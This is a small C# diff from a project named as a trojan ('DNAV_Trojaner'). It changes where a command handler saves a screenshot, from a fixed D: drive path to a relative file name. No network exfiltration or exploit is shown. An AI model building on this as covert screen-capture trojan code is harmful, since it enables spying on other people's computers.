@@ -44,7 +44,7 @@ namespace DNAV_Trojaner
                         break;
                     case "5":
                         ScreenCapture sc = new ScreenCapture();
-                        sc.CaptureScreenToFile("D:\\test.png", System.Drawing.Imaging.ImageFormat.Png);
+                        sc.CaptureScreenToFile("test.png", System.Drawing.Imaging.ImageFormat.Png);
                         break;
                     case "6":
                         Console.Clear();
